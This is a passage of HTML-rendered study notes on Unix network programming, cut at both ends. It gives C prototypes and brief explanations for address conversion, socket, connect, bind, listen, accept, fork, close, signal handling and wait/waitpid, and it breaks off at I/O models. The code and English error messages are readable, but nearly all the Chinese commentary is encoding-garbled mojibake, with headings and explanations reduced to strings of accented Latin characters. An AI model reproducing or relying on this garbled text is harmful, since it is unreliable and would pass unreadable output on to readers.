*dest, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bcopy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *src, <span class="keyword">void</span> *dest, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">bcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *ptr1, <span class="keyword">const</span> <span class="keyword">void</span> *ptr2, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line">Returns: <span class="number">0</span> <span class="keyword">if</span> equal, nonzero <span class="keyword">if</span> unequal</span><br></pre></td></tr></table></figure><p>mem</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memset</span><span class="params">(<span class="keyword">void</span> *dest, <span class="keyword">int</span> c, <span class="keyword">size_t</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memcpy</span><span class="params">(<span class="keyword">void</span> *dest, <span class="keyword">const</span> <span class="keyword">void</span> *src, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>   <span class="title">memcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *ptr1, <span class="keyword">const</span> <span class="keyword">void</span> *ptr2, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line">Returns: <span class="number">0</span> <span class="keyword">if</span> equal, &lt;<span class="number">0</span> <span class="keyword">or</span> &gt;<span class="number">0</span> <span class="function"><span class="keyword">if</span> <span class="title">unequal</span> <span class="params">(see text)</span></span></span><br></pre></td></tr></table></figure><h4 id="åœ°å€è½¬æ¢å‡½æ•°"><a href="#åœ°å€è½¬æ¢å‡½æ•°" class="headerlink" title="åœ°å€è½¬æ¢å‡½æ•°"></a>åœ°å€è½¬æ¢å‡½æ•°</h4><p><strong>IPV4</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="comment">// converts the C character string pointed to by strptr into</span></span><br><span class="line"><span class="comment">// its 32-bit binary network byte ordered value, </span></span><br><span class="line"><span class="comment">// which is stored through the pointer addrptr </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_aton</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *strptr, struct in_addr *addrptr)</span></span>;</span><br><span class="line">Returns: <span class="number">1</span> <span class="keyword">if</span> <span class="built_in">string</span> was valid, <span class="number">0</span> on error</span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">inet_addr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *strptr)</span></span>;</span><br><span class="line">Returns: <span class="number">32</span>-bit binary network byte ordered IPv4 address;    INADDR_NONE <span class="keyword">if</span> error</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">inet_ntoa</span><span class="params">(struct in_addr inaddr)</span></span>;</span><br><span class="line">Returns: pointer to dotted-decimal <span class="built_in">string</span></span><br></pre></td></tr></table></figure><p><code>inet_aton</code> å°†å­—ç¬¦ä¸² strptr è½¬æ¢ä¸º 32æ¯”ç‰¹äºŒè¿›åˆ¶ç½‘ç»œå­—èŠ‚åºåœ°å€ addrptr</p><p><code>inet_addr</code> ä½œç”¨åŒä¸Šï¼Œå‡ºé”™è¿”å› <code>INADDR_NONE</code>255.255.255.255,æ‰€ä»¥ä¸èƒ½å¤„ç†è¯¥åœ°å€ï¼ˆè¢«åºŸå¼ƒï¼‰</p><p><code>inet_ntoa</code> 32bitç½‘ç»œå­—èŠ‚åºåˆ°ç‚¹åˆ†åè¿›åˆ¶IPV4å­—ç¬¦ä¸²ï¼Œå‚¨å­˜åœ¨é™æ€å†…å­˜ï¼Œä¸å¯é‡å…¥</p><p><strong>IPV4/6</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_pton</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">const</span> <span class="keyword">char</span> *strptr, <span class="keyword">void</span> *addrptr)</span></span>;</span><br><span class="line">Returns: <span class="number">1</span> <span class="keyword">if</span> OK, <span class="number">0</span> <span class="keyword">if</span> input <span class="keyword">not</span> a valid presentation format, âˆ’<span class="number">1</span> on error</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">inet_ntop</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">const</span> <span class="keyword">void</span> *addrptr, <span class="keyword">char</span> *strptr, <span class="keyword">size_t</span> len)</span></span>;</span><br><span class="line">Returns: pointer to result <span class="keyword">if</span> OK, <span class="literal">NULL</span> on error</span><br></pre></td></tr></table></figure><p>p - presentation , n - numeric</p><p><code>family</code> : AF_INET / AF_INET6 ä¸æ”¯æŒ errno= <code>EAFNOSUPPORT</code>   </p><p><code>inet_pton</code> : å­—ç¬¦ä¸² strptr è½¬æ¢ä¸º addrptr äºŒè¿›åˆ¶åœ°å€ç»“æœ</p><p><code>inet_ntop</code> :  ç›¸åï¼Œlen ä½ strptr å¤§å°ï¼Œé˜²æ­¢æº¢å‡º - lenå¤ªå°ï¼Œè¿”å›ç©ºæŒ‡é’ˆ errno=<code>ENOSPC</code></p><h4 id="è¯»å†™å‡½æ•°"><a href="#è¯»å†™å‡½æ•°" class="headerlink" title="è¯»å†™å‡½æ•°"></a>è¯»å†™å‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;unp.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">readn</span><span class="params">(<span class="keyword">int</span> filedes, <span class="keyword">void</span> *buff, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">writen</span><span class="params">(<span class="keyword">int</span> filedes, <span class="keyword">const</span> <span class="keyword">void</span> *buff, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">readline</span><span class="params">(<span class="keyword">int</span> filedes, <span class="keyword">void</span> *buff, <span class="keyword">size_t</span> maxlen)</span></span>;</span><br><span class="line">All <span class="keyword">return</span>: number of bytes read <span class="keyword">or</span> written, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><p><code>readline</code> æ¯æ¬¡è¯»ä¸€ä¸ªå­—ç¬¦ï¼Œæç«¯åœ°æ…¢</p><h3 id="Chapter-4"><a href="#Chapter-4" class="headerlink" title="Chapter 4"></a>Chapter 4</h3><p>åŸºæœ¬ TCP å¥—æ¥å­—ç¼–ç¨‹</p><h4 id="Socket-å‡½æ•°"><a href="#Socket-å‡½æ•°" class="headerlink" title="Socket å‡½æ•°"></a>Socket å‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line">Returns: non-negative descriptor <span class="keyword">if</span> OK, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>AF_INET</th><th>AF_INET6</th><th>AF_LOCAL</th><th>AF_ROUTE</th><th>AF_KEY</th></tr></thead><tbody><tr><td>SOCK_STREAM</td><td>TCP|SCTP</td><td>TCP|SCTP</td><td>YES</td><td></td><td></td></tr><tr><td>SOCK_DGRAM</td><td>UDP</td><td>UDP</td><td>YES</td><td></td><td></td></tr><tr><td>SOCK_SEQPACKET</td><td>SCTP</td><td>SCTP</td><td>YES</td><td></td><td></td></tr><tr><td>SOCK_RAW</td><td>IPV4</td><td>IPV6</td><td></td><td>YES</td><td>YES</td></tr></tbody></table><h4 id="Connect-å‡½æ•°"><a href="#Connect-å‡½æ•°" class="headerlink" title="Connect å‡½æ•°"></a>Connect å‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *servaddr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line">Returns: <span class="number">0</span> <span class="keyword">if</span> OK, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><p>client ç”¨äºä¸ server è¿æ¥ï¼Œå†…æ ¸ä¼šè‡ªå·±é€‰æ‹©ä¸´æ—¶ç«¯å£</p><ul><li>75 s æ— å“åº”åè¿”å› <code>ETIMEDOUT</code></li><li>è‹¥ç›¸åº” RST åˆ™é©¬ä¸Šè¿”å› <code>ECONNREFUSED</code> - æŒ‡å®šç«¯å£æ²¡æœ‰ç­‰å¾…è¿æ¥</li><li>ç›®çš„ä¸å¯è¾¾ï¼Œè¿”å› <code>EHOSTUNREACH</code>, <code>ENETUNREACH</code></li></ul><p>é”™è¯¯</p><ul><li><p>å¦‚æœç»™ä¸å­˜åœ¨çš„æœºå™¨å‘é€ï¼Œå› ä¸ºæ²¡æœ‰ ARP reply , <code>ETIMEOUT</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect error: Connection timed out</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœç»™æœªè¿è¡Œ server çš„æœºå™¨å‘é€ï¼Œæ”¶åˆ° RST ï¼Œ <code>ECONNREFUSED</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect error: Connection refused</span><br></pre></td></tr></table></figure></li><li><p>ç»™ä¸å¯è¾¾å‘é€ï¼Œ æ”¶åˆ° ICMP ä¸å¯è¾¾é”™è¯¯ï¼Œ <code>EHOSTUNREACH</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect error: No route to host</span><br></pre></td></tr></table></figure><p>æ¯æ¬¡ connect å¤±è´¥åï¼Œéƒ½éœ€è¦å…³é—­ sockfd é‡æ–°è°ƒç”¨ socket å‡½æ•°</p></li></ul><h4 id="bind-å‡½æ•°"><a href="#bind-å‡½æ•°" class="headerlink" title="bind å‡½æ•°"></a>bind å‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *myaddr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line">Returns: <span class="number">0</span> <span class="keyword">if</span> OK, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><p>32b ipv4 / 128b ipv6 + 16b TCP/UDP port number</p><p><code>Servers</code> ä¼šåœ¨å¯åŠ¨æ—¶è°ƒç”¨ bind ç«¯å£ï¼ˆç¨‹åºå®šä¹‰ï¼‰ ï¼Œè‹¥æ²¡æœ‰åˆ™å½“è°ƒç”¨ connect æˆ– listen æ—¶ï¼Œå†…æ ¸ä¼šé€‰æ‹©ä¸€ä¸ªä¸´æ—¶ç«¯å£  æˆ– æ ¹æ® SYN çš„ç›®çš„åœ°å€</p><p><code>Client</code> é€šå¸¸ä¸ä¼šbind è€Œæ˜¯ connect æ—¶ç”±å†…æ ¸æ ¹æ®è·¯å¾„é€‰æ‹©</p><h5 id="IPåœ°å€"><a href="#IPåœ°å€" class="headerlink" title="IPåœ°å€"></a>IPåœ°å€</h5><p>wildcard é€šé…ç¬¦</p><p>ipv4 : <code>INADDR_ANY</code> 0.0.0.0ï¼Œå†…æ ¸ç­‰åˆ°TCPè¿æ¥ï¼ŒUDPæŠ¥æ–‡å‘é€åé€‰æ‹©ipåœ°å€</p><p>ipv6 : <code>in6addr_any</code> ç”±ç³»ç»Ÿé¢„å…ˆåˆ†é…å¹¶ç½®ä¸º<code>IN6ADDR_ANY_INIT</code></p><p>RPC  ä¾‹å¤–ï¼Œä¼šé€šè¿‡ ç«¯å£æ˜ å°„å™¨æ³¨å†Œ</p><h5 id="é”™è¯¯"><a href="#é”™è¯¯" class="headerlink" title="é”™è¯¯"></a>é”™è¯¯</h5><p><code>EADDRINUSE</code> ï¼š <code>Address already in use</code> åœ°å€å·²ä½¿ç”¨</p><h4 id="listen-å‡½æ•°"><a href="#listen-å‡½æ•°" class="headerlink" title="listen å‡½æ•°"></a>listen å‡½æ•°</h4><p><strong>Server</strong> ï¼š convert unconnected socket into a passive socket </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line">Returns: <span class="number">0</span> <span class="keyword">if</span> OK, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><p><code>backlog</code> : å†…æ ¸é˜Ÿåˆ—ä¸­æ’é˜Ÿçš„æœ€å¤§è¿æ¥æ•° </p><p>è°ƒç”¨æ—¶é—´ï¼š socket bind åï¼Œ accept å‰</p><p>ä¸º listening socket ä¿æŒä¸¤ä¸ªé˜Ÿåˆ—</p><ul><li><code>incomplete connection queue</code> æœªå®Œæˆè¿æ¥é˜Ÿåˆ— ï¼Œ æœªå®Œæˆæ¡æ‰‹ï¼Œ<code>SYN_RCVD</code> æ€</li><li><code>completed connection queue</code>  å·²å®Œæˆè¿æ¥é˜Ÿåˆ— ï¼Œ å®Œæˆæ¡æ‰‹ ï¼Œ <code>ESTABLISHED</code> æ€</li></ul><p>ä¸¤é˜Ÿä¹‹å’Œä¸è¶…è¿‡ backlog</p><h4 id="accept-å‡½æ•°"><a href="#accept-å‡½æ•°" class="headerlink" title="accept å‡½æ•°"></a>accept å‡½æ•°</h4><p> è¿”å›å·²å®Œæˆè¿æ¥é˜Ÿåˆ—é˜Ÿå¤´ï¼Œå¦‚æœä¸ºç©ºï¼Œè¿›ç¨‹ç¡çœ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *cliaddr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line">Returns: non-negative descriptor <span class="keyword">if</span> OK, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><ul><li><code>sockfd</code> : listening socket    ç›‘å¬</li><li><code>return</code> : connected socket å·²è¿æ¥</li><li><code>cliaddr</code> &amp; <code>addrlen</code> ï¼šå¯¹ç«¯çš„åœ°å€å’Œé•¿åº¦ </li><li>ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œç›‘å¬socket ä¿æŒæ‰“å¼€ï¼Œè¿æ¥socketå®Œæˆå¯¹ä¸€ä¸ªå®¢æˆ·çš„æœåŠ¡å°±å…³é—­</li></ul><h5 id="bind-é”™è¯¯"><a href="#bind-é”™è¯¯" class="headerlink" title="bind é”™è¯¯"></a>bind é”™è¯¯</h5><ul><li><p>éè¶…çº§ç”¨æˆ·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bind</span> error: Permission denied</span><br></pre></td></tr></table></figure><h4 id="fork-å’Œ-exec-å‡½æ•°"><a href="#fork-å’Œ-exec-å‡½æ•°" class="headerlink" title="fork å’Œ exec å‡½æ•°"></a>fork å’Œ exec å‡½æ•°</h4></li></ul><p>fork æ˜¯å”¯ä¸€ç”Ÿæˆæ–°è¿›ç¨‹çš„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">Returns: <span class="number">0</span> in child, process ID of child in parent, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><h4 id="å¹¶å‘æœåŠ¡å™¨"><a href="#å¹¶å‘æœåŠ¡å™¨" class="headerlink" title="å¹¶å‘æœåŠ¡å™¨"></a>å¹¶å‘æœåŠ¡å™¨</h4><p>çˆ¶è¿›ç¨‹ listenfd ç›‘å¬ ï¼Œ å­è¿›ç¨‹ connfd è´Ÿè´£æ¥æ”¶æ•°æ®å’Œå®é™… æ“ä½œ</p><h4 id="close-å‡½æ•°"><a href="#close-å‡½æ•°" class="headerlink" title="close å‡½æ•°"></a>close å‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> sockfd)</span></span>;</span><br><span class="line">Returns: <span class="number">0</span> <span class="keyword">if</span> OK, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿å¤šä¸ªè¿›ç¨‹ä½¿ç”¨å¥—æ¥å­—ï¼Œå®ƒæ˜¯å¼•ç”¨è®¡æ•°çš„ã€‚</p><p>å†…æ ¸ ä¼š å‘å®Œæ‰€æœ‰ç­‰å¾…å‘é€çš„æ•°æ®ï¼Œç„¶åTCPè¿æ¥ç»ˆæ­¢è¿‡ç¨‹</p><p>å¦‚æœåªæƒ³å‘é€FINï¼Œæ”¹ç”¨<code>shutdown</code>å‡½æ•°</p><h4 id="åœ°å€-å‡½æ•°"><a href="#åœ°å€-å‡½æ•°" class="headerlink" title="åœ°å€ å‡½æ•°"></a>åœ°å€ å‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsockname</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *localaddr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getpeername</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *peeraddr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line">Both <span class="keyword">return</span>: <span class="number">0</span> <span class="keyword">if</span> OK, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><p>sock æœ¬åœ°ï¼Œpeer è¿æ¥å¯¹ç«¯</p><p>é‡ç‚¹åŸºæœ¬éƒ½è¦æ±‚æŒæ¡ ã€ 5.13ä¸è¦æ±‚æŒæ¡ã€</p><p>6.9ï¼Œ6.20 ä¸è¦æ±‚æŒæ¡</p><h3 id="Chapter-5"><a href="#Chapter-5" class="headerlink" title="Chapter 5"></a>Chapter 5</h3><h4 id="TCP-Echo-Server"><a href="#TCP-Echo-Server" class="headerlink" title="TCP Echo Server"></a>TCP Echo Server</h4><p>Port : 5000 - 49152</p><h4 id="Normal-Startup"><a href="#Normal-Startup" class="headerlink" title="Normal Startup"></a>Normal Startup</h4><p>server é˜»å¡åœ¨  accept ï¼ˆè¿˜æœªå¯åŠ¨ç”¨æˆ·ï¼‰</p><p>client  é˜»å¡åœ¨ fgets è°ƒç”¨</p><p>è¿æ¥</p><p>æœåŠ¡å™¨é˜»å¡åœ¨ read ï¼Œçˆ¶è¿›ç¨‹é˜»å¡åœ¨ accept </p><p>æ­¤æ—¶ ä¸‰ä¸ªè¿›ç¨‹ STAT éƒ½æ˜¯ S- sleeping - ï¼ˆå·²é˜»å¡ï¼‰</p><p><strong>WCHAN</strong> çˆ¶è¿›ç¨‹ wait_for_connect ,  server tcp_data_wait , client - read_chan</p><h4 id="Normal-Termination"><a href="#Normal-Termination" class="headerlink" title="Normal Termination"></a>Normal Termination</h4><p>Client ï¼š EOF å­—ç¬¦ï¼ˆControl+D) ç»ˆæ­¢æœåŠ¡å™¨</p><p>å®¢æˆ·ç«¯è¿›å…¥ TIME_WAIT çŠ¶æ€</p><h4 id="ä¿¡å·å¤„ç†"><a href="#ä¿¡å·å¤„ç†" class="headerlink" title="ä¿¡å·å¤„ç†"></a>ä¿¡å·å¤„ç†</h4><p>SIGKILL &amp; SIGSTOP ä¸èƒ½è¢«æ•è·</p><p>ä¿¡å·å¤„ç†å‡½æ•°æ˜¯ä¸€ä¸ªä»…æœ‰ä¸€ä¸ªæ•´æ•°å‚æ•°ä¸”ä¸è¿”å›å€¼çš„å‡½æ•°</p><h3 id="wait-amp-waitpid"><a href="#wait-amp-waitpid" class="headerlink" title="wait &amp; waitpid"></a>wait &amp; waitpid</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">wait</span><span class="params">(<span class="keyword">int</span> *statloc)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *statloc, <span class="keyword">int</span> options)</span></span>;</span><br><span class="line">Both <span class="keyword">return</span>: process ID <span class="keyword">if</span> OK, <span class="number">0</span> <span class="keyword">or</span> âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><p>å¤„ç†å·²ç»ˆæ­¢çš„å­è¿›ç¨‹</p><ul><li>è¿”å›å€¼ï¼š å·²ç»ˆæ­¢å­è¿›ç¨‹çš„è¿›ç¨‹IDå·ï¼Œé€šè¿‡statlocæŒ‡é’ˆè¿”å›çš„å­è¿›ç¨‹ç»ˆæ­¢çŠ¶æ€ï¼ˆä¸€ä¸ªæ•´æ•°ï¼‰</li><li>å¯¹äºåŒç§ç±»å‹çš„ä¿¡å·ï¼Œä¸»æœºåªä¼šæ‰§è¡Œä¸€æ¬¡ä¿¡å·å¤„ç†å‡½æ•°</li></ul><h4 id="acceptè¿”å›å‰è¿æ¥ä¸­æ­¢"><a href="#acceptè¿”å›å‰è¿æ¥ä¸­æ­¢" class="headerlink" title="acceptè¿”å›å‰è¿æ¥ä¸­æ­¢"></a>acceptè¿”å›å‰è¿æ¥ä¸­æ­¢</h4><p>connect åï¼Œ accept å‰ï¼Œå®¢æˆ·ç«¯å‘é€ RST æŠ¥æ–‡</p><p>POSIX  ï¼š <code>ECONNABORTED</code>  - <code>software caused connection abort</code></p><h4 id="æœåŠ¡å™¨è¿›ç¨‹ç»ˆæ­¢"><a href="#æœåŠ¡å™¨è¿›ç¨‹ç»ˆæ­¢" class="headerlink" title="æœåŠ¡å™¨è¿›ç¨‹ç»ˆæ­¢"></a>æœåŠ¡å™¨è¿›ç¨‹ç»ˆæ­¢</h4><p>æœåŠ¡å™¨è¿›ç¨‹å´©æºƒåï¼Œå¦‚æœclientä¸æ“ä½œï¼Œä¼šé˜»å¡åœ¨fgetsï¼Œè¾“å…¥å­—ç¬¦åï¼Œreadlineå› æ¥æ”¶åˆ°FINè¿”å›0ï¼ˆEOFï¼‰ï¼Œclient è¿”å› ï¼š <code>str_cli: server terminated prematurely</code> - ç¨‹åºå®šä¹‰çš„å¹¶ç»“æŸ</p><p>å¦‚æœå…ˆæ”¶åˆ°äº†RSTï¼Œä¼šè¿”å›<code>ECONNRESET</code> -<code>connection reset by peer</code></p><p>RST ä¼šå› ä¸ºå¹¶æ²¡æœ‰ä¸è¯¥å®¢æˆ·ç«¯è¿æ¥ä½†æ˜¯æ¥æ”¶åˆ°è¯¥å®¢æˆ·ç«¯å‘é€çš„å†…å®¹è€Œè¢«æœåŠ¡å™¨å‘é€</p><h4 id="æœåŠ¡å™¨ä¸»æœºå´©æºƒ"><a href="#æœåŠ¡å™¨ä¸»æœºå´©æºƒ" class="headerlink" title="æœåŠ¡å™¨ä¸»æœºå´©æºƒ"></a>æœåŠ¡å™¨ä¸»æœºå´©æºƒ</h4><p>åŒä¸Šé¢ä¸åŒçš„æ˜¯ï¼ŒæœåŠ¡å™¨å¹¶ä¸ä¼šæœ‰ä»»ä½•ååº”ï¼Œä¼šæœ‰ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š</p><ul><li>ä¸€ç›´æ²¡æœ‰å“åº” <code>ETIMEOUT</code></li><li>ä¸­é—´è·¯ç”±å™¨åˆ¤æ–­ä¸å¯è¾¾ï¼Œå“åº”ä¸€ä¸ª <code>destination unreachable</code> çš„ ICMPï¼Œè¿”å›çš„é”™è¯¯æ˜¯<code>EHOSTUNREACH</code>æˆ– <code>ENETUNREACH</code></li></ul><h4 id="æœåŠ¡å™¨ä¸»æœºå´©æºƒåé‡å¯"><a href="#æœåŠ¡å™¨ä¸»æœºå´©æºƒåé‡å¯" class="headerlink" title="æœåŠ¡å™¨ä¸»æœºå´©æºƒåé‡å¯"></a>æœåŠ¡å™¨ä¸»æœºå´©æºƒåé‡å¯</h4><p>å½“æœåŠ¡å™¨ä¸»æœºå´©æºƒåé‡å¯æ—¶ï¼Œå®ƒçš„TCPä¸¢å¤±äº†å´©æºƒå‰çš„æ‰€æœ‰è¿æ¥ä¿¡æ¯ï¼Œå› æ­¤æœåŠ¡å™¨TCPå¯¹äºæ‰€æ”¶åˆ°çš„æ¥è‡ªå®¢æˆ·çš„æ•°æ®åˆ†èŠ‚å“åº”ä»¥ ä¸€ä¸ªRST</p><h4 id="æ•°æ®æ ¼å¼"><a href="#æ•°æ®æ ¼å¼" class="headerlink" title="æ•°æ®æ ¼å¼"></a>æ•°æ®æ ¼å¼</h4><p>æœåŠ¡å™¨è¯»å…¥æ¢è¡Œç¬¦ï¼Œæ‰€æœç´¢çš„åªæ˜¯æ¢è¡Œç¬¦</p><p>äºŒè¿›åˆ¶ ï¼š <code>sscanf</code> è½¬æ¢åˆ° ç»“æ„ä½“ binary ï¼Œå‘é€åï¼Œå¯¹æ–¹ä¹Ÿç”¨åŒæ ·çš„ç»“æ„ä½“æ¥æ”¶ã€‚</p><p>å¤§å°ç«¯ä¸åŒ ï¼Œ åŒæ ·intå‹é•¿åº¦ä¸åŒï¼Œç»“æ„ä½“çš„æ‰“åŒ…æ–¹å¼ä¸åŒ éƒ½ä¼šå¯¼è‡´è´Ÿæ•°ä¸è¡Œï¼Œ</p><p>è§£å†³æ–¹æ³•ï¼š å‘é€ string ï¼Œ ç”¨ XDRï¼ˆexternal data representation) å‘é€</p><h3 id="Chapter-6"><a href="#Chapter-6" class="headerlink" title="Chapter 6"></a>Chapter 6</h3><h4 id="I-O-Model"><a href="#I-O-Model" class="headerlink" title="I/O Model"></a>I/O Model</h4><p>åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ† ï¼š ç­‰å¾…å¯¹ç«¯å‘é€æ•°æ® ï¼Œå°†æ•°æ®ä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ·</p><ul><li>blocking ï¼š 